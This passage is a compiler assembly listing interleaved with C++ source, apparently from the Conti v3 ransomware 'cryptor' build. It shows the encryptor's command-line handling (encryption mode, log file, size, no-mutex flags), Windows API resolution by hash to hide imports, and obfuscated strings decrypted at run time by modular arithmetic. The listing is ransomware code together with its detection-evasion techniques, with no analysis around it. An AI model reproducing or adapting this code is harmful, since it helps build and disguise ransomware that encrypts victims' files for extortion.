  001dd	8b c2		 mov	 eax, edx
  001df	c1 e8 1f	 shr	 eax, 31
  001e2	03 d0		 add	 edx, eax
  001e4	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  001e7	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  001ea	46 88 44 0c 49	 mov	 BYTE PTR $T2[rsp+r9+1], r8b
  001ef	49 ff c1	 inc	 r9
  001f2	49 83 f9 06	 cmp	 r9, 6
  001f6	72 a8		 jb	 SHORT $LL72@HandleComm
$LN71@HandleComm:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 140  : 	LPWSTR EncryptMode = GetCommandLineArg(Argv, Argc, OBFW(L"-m"));

  001f8	4c 63 65 e8	 movsxd	 r12, DWORD PTR Argc$[rbp-256]
  001fc	41 83 fc 01	 cmp	 r12d, 1

; 69   : 	if (Argc <= 1) {

  00200	7e 5d		 jle	 SHORT $LN523@HandleComm

; 70   : 		return NULL;
; 71   : 	}
; 72   : 
; 73   : 	for (INT i = 1; i < Argc; i++) {

  00202	41 bf 01 00 00
	00		 mov	 r15d, 1
  00208	4d 3b e7	 cmp	 r12, r15
  0020b	7e 4f		 jle	 SHORT $LN484@HandleComm
  0020d	41 8b ff	 mov	 edi, r15d
  00210	41 8d 77 01	 lea	 esi, QWORD PTR [r15+1]
  00214	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL84@HandleComm:

; 74   : 		if (!plstrcmpiW(Argv[i], ArgName)) {

  00220	49 8b 1c fe	 mov	 rbx, QWORD PTR [r14+rdi*8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 343  : 	pFunction = (INT(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xcd7328ca, 81);//GetProcAddress(hKernel32, OBFA("lstrcmpiW"));

  00224	ba 0f 00 00 00	 mov	 edx, 15
  00229	41 b8 ca 28 73
	cd		 mov	 r8d, -848090934		; cd7328caH
  0022f	44 8d 4a 42	 lea	 r9d, QWORD PTR [rdx+66]
  00233	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 344  : 	return pFunction(lpString1, lpString2);

  00238	48 8d 54 24 49	 lea	 rdx, QWORD PTR $T2[rsp+1]
  0023d	48 8b cb	 mov	 rcx, rbx
  00240	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 74   : 		if (!plstrcmpiW(Argv[i], ArgName)) {

  00242	85 c0		 test	 eax, eax
  00244	75 09		 jne	 SHORT $LN82@HandleComm

; 75   : 
; 76   : 			if ((i + 1) < Argc) {

  00246	41 3b f4	 cmp	 esi, r12d
  00249	0f 8c 1c 04 00
	00		 jl	 $LN437@HandleComm
$LN82@HandleComm:

; 70   : 		return NULL;
; 71   : 	}
; 72   : 
; 73   : 	for (INT i = 1; i < Argc; i++) {

  0024f	41 ff c7	 inc	 r15d
  00252	ff c6		 inc	 esi
  00254	48 ff c7	 inc	 rdi
  00257	49 3b fc	 cmp	 rdi, r12
  0025a	7c c4		 jl	 SHORT $LL84@HandleComm
$LN484@HandleComm:

; 78   : 			}
; 79   : 
; 80   : 		}
; 81   : 	}
; 82   : 
; 83   : 	return NULL;

  0025c	45 33 ed	 xor	 r13d, r13d
$LN523@HandleComm:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0025f	4c 89 6d d0	 mov	 QWORD PTR EncryptMode$1$[rbp-256], r13
$LN81@HandleComm:
  00263	c6 44 24 70 00	 mov	 BYTE PTR $T3[rsp], 0
  00268	c6 44 24 71 48	 mov	 BYTE PTR $T3[rsp+1], 72	; 00000048H
  0026d	c6 44 24 72 05	 mov	 BYTE PTR $T3[rsp+2], 5
  00272	c6 44 24 73 73	 mov	 BYTE PTR $T3[rsp+3], 115 ; 00000073H
  00277	c6 44 24 74 05	 mov	 BYTE PTR $T3[rsp+4], 5
  0027c	c6 44 24 75 6f	 mov	 BYTE PTR $T3[rsp+5], 111 ; 0000006fH
  00281	c6 44 24 76 05	 mov	 BYTE PTR $T3[rsp+6], 5
  00286	c6 44 24 77 25	 mov	 BYTE PTR $T3[rsp+7], 37	; 00000025H
  0028b	c6 44 24 78 05	 mov	 BYTE PTR $T3[rsp+8], 5
  00290	c6 44 24 79 05	 mov	 BYTE PTR $T3[rsp+9], 5
  00295	c6 44 24 7a 05	 mov	 BYTE PTR $T3[rsp+10], 5
  0029a	0f b6 44 24 71	 movzx	 eax, BYTE PTR $T3[rsp+1]

; 58   :         return m_isDecrypted;

  0029f	0f b6 44 24 70	 movzx	 eax, BYTE PTR $T3[rsp]

; 63   :         if (!isDecrypted())

  002a4	84 c0		 test	 al, al
  002a6	75 5d		 jne	 SHORT $LN115@HandleComm

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  002a8	4d 8b cd	 mov	 r9, r13
  002ab	0f 1f 44 00 00	 npad	 5
$LL116@HandleComm:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  002b0	42 0f b6 4c 0c
	71		 movzx	 ecx, BYTE PTR $T3[rsp+r9+1]

; 40   :     return (a % n + n) % n;

  002b6	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  002bb	83 e9 05	 sub	 ecx, 5
  002be	44 6b c1 1f	 imul	 r8d, ecx, 31

; 40   :     return (a % n + n) % n;

  002c2	41 f7 e8	 imul	 r8d
  002c5	41 03 d0	 add	 edx, r8d
  002c8	c1 fa 06	 sar	 edx, 6
  002cb	8b c2		 mov	 eax, edx
  002cd	c1 e8 1f	 shr	 eax, 31
  002d0	03 d0		 add	 edx, eax
  002d2	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  002d5	44 2b c0	 sub	 r8d, eax
  002d8	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  002dd	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  002e1	41 f7 e8	 imul	 r8d
  002e4	41 03 d0	 add	 edx, r8d
  002e7	c1 fa 06	 sar	 edx, 6
  002ea	8b c2		 mov	 eax, edx
  002ec	c1 e8 1f	 shr	 eax, 31
  002ef	03 d0		 add	 edx, eax
  002f1	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  002f4	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  002f7	46 88 44 0c 71	 mov	 BYTE PTR $T3[rsp+r9+1], r8b
  002fc	49 ff c1	 inc	 r9
  002ff	49 83 f9 0a	 cmp	 r9, 10
  00303	72 ab		 jb	 SHORT $LL116@HandleComm
$LN115@HandleComm:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 141  : 	LPWSTR LogFile = GetCommandLineArg(Argv, Argc, OBFW(L"-log"));

  00305	4c 63 65 e8	 movsxd	 r12, DWORD PTR Argc$[rbp-256]
  00309	41 83 fc 01	 cmp	 r12d, 1

; 69   : 	if (Argc <= 1) {

  0030d	7e 51		 jle	 SHORT $LN524@HandleComm

; 70   : 		return NULL;
; 71   : 	}
; 72   : 
; 73   : 	for (INT i = 1; i < Argc; i++) {

  0030f	41 bf 01 00 00
	00		 mov	 r15d, 1
  00315	4d 3b e7	 cmp	 r12, r15
  00318	7e 43		 jle	 SHORT $LN485@HandleComm
  0031a	41 8b ff	 mov	 edi, r15d
  0031d	41 8d 77 01	 lea	 esi, QWORD PTR [r15+1]
$LL128@HandleComm:

; 74   : 		if (!plstrcmpiW(Argv[i], ArgName)) {

  00321	49 8b 1c fe	 mov	 rbx, QWORD PTR [r14+rdi*8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 343  : 	pFunction = (INT(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xcd7328ca, 81);//GetProcAddress(hKernel32, OBFA("lstrcmpiW"));

  00325	ba 0f 00 00 00	 mov	 edx, 15
  0032a	41 b8 ca 28 73
	cd		 mov	 r8d, -848090934		; cd7328caH
  00330	44 8d 4a 42	 lea	 r9d, QWORD PTR [rdx+66]
  00334	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 344  : 	return pFunction(lpString1, lpString2);

  00339	48 8d 54 24 71	 lea	 rdx, QWORD PTR $T3[rsp+1]
  0033e	48 8b cb	 mov	 rcx, rbx
  00341	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 74   : 		if (!plstrcmpiW(Argv[i], ArgName)) {

  00343	85 c0		 test	 eax, eax
  00345	75 09		 jne	 SHORT $LN126@HandleComm

; 75   : 
; 76   : 			if ((i + 1) < Argc) {

  00347	41 3b f4	 cmp	 esi, r12d
  0034a	0f 8c 2f 03 00
	00		 jl	 $LN438@HandleComm
$LN126@HandleComm:

; 70   : 		return NULL;
; 71   : 	}
; 72   : 
; 73   : 	for (INT i = 1; i < Argc; i++) {

  00350	41 ff c7	 inc	 r15d
  00353	ff c6		 inc	 esi
  00355	48 ff c7	 inc	 rdi
  00358	49 3b fc	 cmp	 rdi, r12
  0035b	7c c4		 jl	 SHORT $LL128@HandleComm
$LN485@HandleComm:

; 78   : 			}
; 79   : 
; 80   : 		}
; 81   : 	}
; 82   : 
; 83   : 	return NULL;

  0035d	45 33 ed	 xor	 r13d, r13d
$LN524@HandleComm:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00360	4c 89 6d e0	 mov	 QWORD PTR LogFile$1$[rbp-256], r13
$LN125@HandleComm:
  00364	c6 45 80 00	 mov	 BYTE PTR $T4[rbp-256], 0
  00368	c6 45 81 59	 mov	 BYTE PTR $T4[rbp-255], 89 ; 00000059H
  0036c	c6 45 82 54	 mov	 BYTE PTR $T4[rbp-254], 84 ; 00000054H
  00370	c6 45 83 7d	 mov	 BYTE PTR $T4[rbp-253], 125 ; 0000007dH
  00374	c6 45 84 54	 mov	 BYTE PTR $T4[rbp-252], 84 ; 00000054H
  00378	c6 45 85 0b	 mov	 BYTE PTR $T4[rbp-251], 11
  0037c	c6 45 86 54	 mov	 BYTE PTR $T4[rbp-250], 84 ; 00000054H
  00380	c6 45 87 1b	 mov	 BYTE PTR $T4[rbp-249], 27
  00384	c6 45 88 54	 mov	 BYTE PTR $T4[rbp-248], 84 ; 00000054H
  00388	c6 45 89 43	 mov	 BYTE PTR $T4[rbp-247], 67 ; 00000043H
  0038c	c6 45 8a 54	 mov	 BYTE PTR $T4[rbp-246], 84 ; 00000054H
  00390	c6 45 8b 54	 mov	 BYTE PTR $T4[rbp-245], 84 ; 00000054H
  00394	c6 45 8c 54	 mov	 BYTE PTR $T4[rbp-244], 84 ; 00000054H
  00398	0f b6 45 81	 movzx	 eax, BYTE PTR $T4[rbp-255]

; 58   :         return m_isDecrypted;

  0039c	0f b6 45 80	 movzx	 eax, BYTE PTR $T4[rbp-256]

; 63   :         if (!isDecrypted())

  003a0	84 c0		 test	 al, al
  003a2	75 61		 jne	 SHORT $LN163@HandleComm

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  003a4	4d 8b cd	 mov	 r9, r13
  003a7	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL164@HandleComm:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  003b0	42 0f b6 4c 0d
	81		 movzx	 ecx, BYTE PTR $T4[rbp+r9-255]

; 40   :     return (a % n + n) % n;

  003b6	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  003bb	83 e9 54	 sub	 ecx, 84			; 00000054H
  003be	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]

; 40   :     return (a % n + n) % n;

  003c2	41 f7 e8	 imul	 r8d
  003c5	41 03 d0	 add	 edx, r8d
  003c8	c1 fa 06	 sar	 edx, 6
  003cb	8b c2		 mov	 eax, edx
  003cd	c1 e8 1f	 shr	 eax, 31
  003d0	03 d0		 add	 edx, eax
  003d2	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  003d5	44 2b c0	 sub	 r8d, eax
  003d8	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  003dd	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  003e1	41 f7 e8	 imul	 r8d
  003e4	41 03 d0	 add	 edx, r8d
  003e7	c1 fa 06	 sar	 edx, 6
  003ea	8b c2		 mov	 eax, edx
  003ec	c1 e8 1f	 shr	 eax, 31
  003ef	03 d0		 add	 edx, eax
  003f1	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  003f4	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  003f7	46 88 44 0d 81	 mov	 BYTE PTR $T4[rbp+r9-255], r8b
  003fc	49 ff c1	 inc	 r9
  003ff	49 83 f9 0c	 cmp	 r9, 12
  00403	72 ab		 jb	 SHORT $LL164@HandleComm
$LN163@HandleComm:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 142  : 	LPWSTR Size = GetCommandLineArg(Argv, Argc, OBFW(L"-size"));

  00405	4c 63 65 e8	 movsxd	 r12, DWORD PTR Argc$[rbp-256]
  00409	41 83 fc 01	 cmp	 r12d, 1

; 69   : 	if (Argc <= 1) {

  0040d	7e 50		 jle	 SHORT $LN525@HandleComm

; 70   : 		return NULL;
; 71   : 	}
; 72   : 
; 73   : 	for (INT i = 1; i < Argc; i++) {

  0040f	41 bf 01 00 00
	00		 mov	 r15d, 1
  00415	4d 3b e7	 cmp	 r12, r15
  00418	7e 42		 jle	 SHORT $LN486@HandleComm
  0041a	41 8b ff	 mov	 edi, r15d
  0041d	41 8d 77 01	 lea	 esi, QWORD PTR [r15+1]
$LL176@HandleComm:

; 74   : 		if (!plstrcmpiW(Argv[i], ArgName)) {

  00421	49 8b 1c fe	 mov	 rbx, QWORD PTR [r14+rdi*8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 343  : 	pFunction = (INT(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xcd7328ca, 81);//GetProcAddress(hKernel32, OBFA("lstrcmpiW"));

  00425	ba 0f 00 00 00	 mov	 edx, 15
  0042a	41 b8 ca 28 73
	cd		 mov	 r8d, -848090934		; cd7328caH
  00430	44 8d 4a 42	 lea	 r9d, QWORD PTR [rdx+66]
  00434	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 344  : 	return pFunction(lpString1, lpString2);

  00439	48 8d 55 81	 lea	 rdx, QWORD PTR $T4[rbp-255]
  0043d	48 8b cb	 mov	 rcx, rbx
  00440	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 74   : 		if (!plstrcmpiW(Argv[i], ArgName)) {

  00442	85 c0		 test	 eax, eax
  00444	75 09		 jne	 SHORT $LN174@HandleComm

; 75   : 
; 76   : 			if ((i + 1) < Argc) {

  00446	41 3b f4	 cmp	 esi, r12d
  00449	0f 8c 44 02 00
	00		 jl	 $LN439@HandleComm
$LN174@HandleComm:

; 70   : 		return NULL;
; 71   : 	}
; 72   : 
; 73   : 	for (INT i = 1; i < Argc; i++) {

  0044f	41 ff c7	 inc	 r15d
  00452	ff c6		 inc	 esi
  00454	48 ff c7	 inc	 rdi
  00457	49 3b fc	 cmp	 rdi, r12
  0045a	7c c5		 jl	 SHORT $LL176@HandleComm
$LN486@HandleComm:

; 78   : 			}
; 79   : 
; 80   : 		}
; 81   : 	}
; 82   : 
; 83   : 	return NULL;

  0045c	45 33 ed	 xor	 r13d, r13d
$LN525@HandleComm:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0045f	4d 8b fd	 mov	 r15, r13
$LN173@HandleComm:

; 58   :         return m_isDecrypted;

  00462	4c 8b a4 24 48
	01 00 00	 mov	 r12, QWORD PTR [rsp+328]

; 83   :     volatile bool m_isDecrypted = false;

  0046a	c6 45 b8 00	 mov	 BYTE PTR $T5[rbp-256], 0
  0046e	c6 45 b9 7e	 mov	 BYTE PTR $T5[rbp-255], 126 ; 0000007eH
  00472	c6 45 ba 6b	 mov	 BYTE PTR $T5[rbp-254], 107 ; 0000006bH
  00476	c6 45 bb 61	 mov	 BYTE PTR $T5[rbp-253], 97 ; 00000061H
  0047a	c6 45 bc 6b	 mov	 BYTE PTR $T5[rbp-252], 107 ; 0000006bH
  0047e	c6 45 bd 78	 mov	 BYTE PTR $T5[rbp-251], 120 ; 00000078H
  00482	c6 45 be 6b	 mov	 BYTE PTR $T5[rbp-250], 107 ; 0000006bH
  00486	c6 45 bf 4a	 mov	 BYTE PTR $T5[rbp-249], 74 ; 0000004aH
  0048a	c6 45 c0 6b	 mov	 BYTE PTR $T5[rbp-248], 107 ; 0000006bH
  0048e	c6 45 c1 04	 mov	 BYTE PTR $T5[rbp-247], 4
  00492	c6 45 c2 6b	 mov	 BYTE PTR $T5[rbp-246], 107 ; 0000006bH
  00496	c6 45 c3 6c	 mov	 BYTE PTR $T5[rbp-245], 108 ; 0000006cH
  0049a	c6 45 c4 6b	 mov	 BYTE PTR $T5[rbp-244], 107 ; 0000006bH
  0049e	c6 45 c5 11	 mov	 BYTE PTR $T5[rbp-243], 17
  004a2	c6 45 c6 6b	 mov	 BYTE PTR $T5[rbp-242], 107 ; 0000006bH
  004a6	c6 45 c7 49	 mov	 BYTE PTR $T5[rbp-241], 73 ; 00000049H
  004aa	c6 45 c8 6b	 mov	 BYTE PTR $T5[rbp-240], 107 ; 0000006bH
  004ae	c6 45 c9 6b	 mov	 BYTE PTR $T5[rbp-239], 107 ; 0000006bH
  004b2	c6 45 ca 6b	 mov	 BYTE PTR $T5[rbp-238], 107 ; 0000006bH
  004b6	0f b6 45 b9	 movzx	 eax, BYTE PTR $T5[rbp-255]

; 58   :         return m_isDecrypted;

  004ba	0f b6 45 b8	 movzx	 eax, BYTE PTR $T5[rbp-256]

; 63   :         if (!isDecrypted())

  004be	84 c0		 test	 al, al
  004c0	75 5f		 jne	 SHORT $LN223@HandleComm

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  004c2	4d 8b c5	 mov	 r8, r13
  004c5	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL224@HandleComm:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  004d0	42 0f b6 4c 05
	b9		 movzx	 ecx, BYTE PTR $T5[rbp+r8-255]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  004d6	b8 6b 00 00 00	 mov	 eax, 107		; 0000006bH
  004db	2b c1		 sub	 eax, ecx
  004dd	6b c8 0b	 imul	 ecx, eax, 11

; 40   :     return (a % n + n) % n;

  004e0	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  004e5	f7 e9		 imul	 ecx
  004e7	03 d1		 add	 edx, ecx
  004e9	c1 fa 06	 sar	 edx, 6
  004ec	8b c2		 mov	 eax, edx
  004ee	c1 e8 1f	 shr	 eax, 31
  004f1	03 d0		 add	 edx, eax
  004f3	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  004f6	2b c8		 sub	 ecx, eax
  004f8	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  004fd	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00500	f7 e9		 imul	 ecx
  00502	03 d1		 add	 edx, ecx
  00504	c1 fa 06	 sar	 edx, 6
  00507	8b c2		 mov	 eax, edx
  00509	c1 e8 1f	 shr	 eax, 31
  0050c	03 d0		 add	 edx, eax
  0050e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00511	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00513	42 88 4c 05 b9	 mov	 BYTE PTR $T5[rbp+r8-255], cl
  00518	49 ff c0	 inc	 r8
  0051b	49 83 f8 12	 cmp	 r8, 18
  0051f	72 af		 jb	 SHORT $LL224@HandleComm
$LN223@HandleComm:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 94   : 	if (Argc <= 1) {

  00521	48 63 45 e8	 movsxd	 rax, DWORD PTR Argc$[rbp-256]
  00525	83 f8 01	 cmp	 eax, 1
  00528	7e 47		 jle	 SHORT $LN235@HandleComm

; 95   : 		return FALSE;
; 96   : 	}
; 97   : 
; 98   : 	for (INT i = 1; i < Argc; i++) {

  0052a	48 8b f0	 mov	 rsi, rax
  0052d	48 83 f8 01	 cmp	 rax, 1
  00531	7e 3e		 jle	 SHORT $LN235@HandleComm
  00533	bf 01 00 00 00	 mov	 edi, 1
  00538	0f 1f 84 00 00
	00 00 00	 npad	 8
$LL236@HandleComm:

; 99   : 		if (!plstrcmpiW(Argv[i], ArgName)) {

  00540	49 8b 1c fe	 mov	 rbx, QWORD PTR [r14+rdi*8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 343  : 	pFunction = (INT(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xcd7328ca, 81);//GetProcAddress(hKernel32, OBFA("lstrcmpiW"));

  00544	ba 0f 00 00 00	 mov	 edx, 15
  00549	41 b8 ca 28 73
	cd		 mov	 r8d, -848090934		; cd7328caH
  0054f	44 8d 4a 42	 lea	 r9d, QWORD PTR [rdx+66]
  00553	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 344  : 	return pFunction(lpString1, lpString2);

  00558	48 8d 55 b9	 lea	 rdx, QWORD PTR $T5[rbp-255]
  0055c	48 8b cb	 mov	 rcx, rbx
  0055f	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 99   : 		if (!plstrcmpiW(Argv[i], ArgName)) {

  00561	85 c0		 test	 eax, eax
  00563	0f 84 3a 01 00
	00		 je	 $LN440@HandleComm

; 95   : 		return FALSE;
; 96   : 	}
; 97   : 
; 98   : 	for (INT i = 1; i < Argc; i++) {

  00569	48 ff c7	 inc	 rdi
  0056c	48 3b fe	 cmp	 rdi, rsi
  0056f	7c cf		 jl	 SHORT $LL236@HandleComm
$LN235@HandleComm:

; 143  : 
; 144  : 	if (FindCommandLineArg(Argv, Argc, OBFW(L"-nomutex"))) {
; 145  : 		g_NoMutex = TRUE;
; 146  : 	}
; 147  : 	else {
; 148  : 		g_NoMutex = FALSE;
; 149  : 	}
; 150  : 
; 151  : 	if (EncryptMode) {

  00571	41 8b c5	 mov	 eax, r13d
$LN233@HandleComm:
  00574	48 8b 5d d0	 mov	 rbx, QWORD PTR EncryptMode$1$[rbp-256]
  00578	48 8b b4 24 38
	01 00 00	 mov	 rsi, QWORD PTR [rsp+312]
  00580	89 05 00 00 00
	00		 mov	 DWORD PTR ?g_NoMutex@@3HA, eax ; g_NoMutex
  00586	48 85 db	 test	 rbx, rbx
  00589	0f 84 85 03 00
	00		 je	 $LN12@HandleComm
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0058f	c6 44 24 50 00	 mov	 BYTE PTR $T7[rsp], 0
  00594	c6 44 24 51 32	 mov	 BYTE PTR $T7[rsp+1], 50	; 00000032H
  00599	c6 44 24 52 74	 mov	 BYTE PTR $T7[rsp+2], 116 ; 00000074H
  0059e	c6 44 24 53 7d	 mov	 BYTE PTR $T7[rsp+3], 125 ; 0000007dH
  005a3	c6 44 24 54 74	 mov	 BYTE PTR $T7[rsp+4], 116 ; 00000074H
  005a8	c6 44 24 55 7d	 mov	 BYTE PTR $T7[rsp+5], 125 ; 0000007dH
  005ad	c6 44 24 56 74	 mov	 BYTE PTR $T7[rsp+6], 116 ; 00000074H
  005b2	c6 44 24 57 74	 mov	 BYTE PTR $T7[rsp+7], 116 ; 00000074H
  005b7	c6 44 24 58 74	 mov	 BYTE PTR $T7[rsp+8], 116 ; 00000074H
  005bc	0f b6 44 24 51	 movzx	 eax, BYTE PTR $T7[rsp+1]

; 58   :         return m_isDecrypted;

  005c1	0f b6 44 24 50	 movzx	 eax, BYTE PTR $T7[rsp]

; 63   :         if (!isDecrypted())

  005c6	84 c0		 test	 al, al
  005c8	75 5f		 jne	 SHORT $LN262@HandleComm

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  005ca	4d 8b cd	 mov	 r9, r13
  005cd	0f 1f 00	 npad	 3
$LL263@HandleComm:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  005d0	42 0f b6 4c 0c
	51		 movzx	 ecx, BYTE PTR $T7[rsp+r9+1]

; 40   :     return (a % n + n) % n;

  005d6	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  005db	83 e9 74	 sub	 ecx, 116		; 00000074H
  005de	44 8d 04 49	 lea	 r8d, DWORD PTR [rcx+rcx*2]
  005e2	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  005e6	41 f7 e8	 imul	 r8d
  005e9	41 03 d0	 add	 edx, r8d
  005ec	c1 fa 06	 sar	 edx, 6
  005ef	8b c2		 mov	 eax, edx
  005f1	c1 e8 1f	 shr	 eax, 31
  005f4	03 d0		 add	 edx, eax
  005f6	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  005f9	44 2b c0	 sub	 r8d, eax
  005fc	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00601	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00605	41 f7 e8	 imul	 r8d
  00608	41 03 d0	 add	 edx, r8d
  0060b	c1 fa 06	 sar	 edx, 6
  0060e	8b c2		 mov	 eax, edx
  00610	c1 e8 1f	 shr	 eax, 31
  00613	03 d0		 add	 edx, eax
  00615	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00618	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0061b	46 88 44 0c 51	 mov	 BYTE PTR $T7[rsp+r9+1], r8b
  00620	49 ff c1	 inc	 r9
  00623	49 83 f9 08	 cmp	 r9, 8
  00627	72 a7		 jb	 SHORT $LL263@HandleComm
$LN262@HandleComm:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 343  : 	pFunction = (INT(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xcd7328ca, 81);//GetProcAddress(hKernel32, OBFA("lstrcmpiW"));

  00629	ba 0f 00 00 00	 mov	 edx, 15
  0062e	41 b8 ca 28 73
	cd		 mov	 r8d, -848090934		; cd7328caH
  00634	44 8d 4a 42	 lea	 r9d, QWORD PTR [rdx+66]
  00638	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 344  : 	return pFunction(lpString1, lpString2);

  0063d	48 8d 54 24 51	 lea	 rdx, QWORD PTR $T7[rsp+1]
  00642	48 8b cb	 mov	 rcx, rbx
  00645	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 153  : 		if (!plstrcmpiW(EncryptMode, OBFW(L"all"))) {

  00647	85 c0		 test	 eax, eax
  00649	75 62		 jne	 SHORT $LN6@HandleComm

; 154  : 			global::SetEncryptMode(ALL_ENCRYPT);

  0064b	c7 05 00 00 00
	00 0a 00 00 00	 mov	 DWORD PTR ?g_EncryptMode@@3HA, 10 ; g_EncryptMode

; 155  : 		}

  00655	e9 ba 02 00 00	 jmp	 $LN12@HandleComm
$LN436@HandleComm:

; 77   : 				return Argv[i + 1];

  0065a	49 63 c7	 movsxd	 rax, r15d
  0065d	49 8b 44 c6 08	 mov	 rax, QWORD PTR [r14+rax*8+8]
  00662	48 89 45 d8	 mov	 QWORD PTR Path$1$[rbp-256], rax
  00666	e9 f6 fa ff ff	 jmp	 $LN45@HandleComm
$LN437@HandleComm:
  0066b	49 63 c7	 movsxd	 rax, r15d
  0066e	45 33 ed	 xor	 r13d, r13d
  00671	49 8b 44 c6 08	 mov	 rax, QWORD PTR [r14+rax*8+8]
  00676	48 89 45 d0	 mov	 QWORD PTR EncryptMode$1$[rbp-256], rax
  0067a	e9 e4 fb ff ff	 jmp	 $LN81@HandleComm
$LN438@HandleComm:
  0067f	49 63 c7	 movsxd	 rax, r15d
  00682	45 33 ed	 xor	 r13d, r13d
  00685	49 8b 4c c6 08	 mov	 rcx, QWORD PTR [r14+rax*8+8]
  0068a	48 89 4d e0	 mov	 QWORD PTR LogFile$1$[rbp-256], rcx
  0068e	e9 d1 fc ff ff	 jmp	 $LN125@HandleComm
$LN439@HandleComm:
  00693	49 63 c7	 movsxd	 rax, r15d
  00696	45 33 ed	 xor	 r13d, r13d
